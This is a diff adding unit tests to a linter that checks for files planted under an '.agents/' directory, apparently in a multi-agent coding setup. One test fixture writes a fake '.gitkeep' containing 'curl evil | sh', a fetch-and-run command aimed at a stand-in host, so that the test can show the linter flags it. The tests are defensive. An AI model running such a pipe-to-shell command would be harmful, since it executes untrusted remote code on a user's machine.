@@ -179,6 +179,32 @@ class TestLayoutLinter(unittest.TestCase):
         self.assertIn(".agents/rogue_agent/planted_test.rs", violations)
         self.assertIn(".agents/rogue_agent/malicious.sh", violations)
 
+    def test_directory_placeholders_are_not_leakage(self):
+        """Measured: a repo that tracks .gitkeep/.keep under .agents/ killed every teamwork run
+        at its first turn-end, because a dotfile has no suffix to allowlist."""
+        d = self.tmp / ".agents" / "teamwork" / "orchestrator_1"
+        d.mkdir(parents=True, exist_ok=True)
+        (d / ".gitkeep").write_text("# Orchestrator Directory\n", encoding="utf-8")
+        (self.tmp / ".agents" / "implementer_r1").mkdir(parents=True, exist_ok=True)
+        (self.tmp / ".agents" / "implementer_r1" / ".keep").write_text("assigned\n", encoding="utf-8")
+        self.assertEqual(adapters.validate_agents_metadata_layout(self.tmp), [])
+
+    def test_placeholder_name_cannot_smuggle_a_script(self):
+        """The negative side: the exemption is for inert placeholders, not for the NAME. A
+        .gitkeep with a shebang, or with the execute bit set, is still planted code, and a
+        suffix-less executable under any other name is still caught."""
+        d = self.tmp / ".agents" / "rogue"
+        d.mkdir(parents=True, exist_ok=True)
+        (d / ".gitkeep").write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
+        exe = d / ".keep"
+        exe.write_text("payload\n", encoding="utf-8")
+        exe.chmod(0o755)
+        (d / "run").write_text("#!/bin/sh\n", encoding="utf-8")
+        v = adapters.validate_agents_metadata_layout(self.tmp)
+        self.assertIn(".agents/rogue/.gitkeep", v)
+        self.assertIn(".agents/rogue/.keep", v)
+        self.assertIn(".agents/rogue/run", v)
+
     def test_cmd_base_audit_fails_closed_on_agents_leakage(self):
         agents_dir = self.tmp / ".agents" / "worker_1"
         agents_dir.mkdir(parents=True, exist_ok=True)
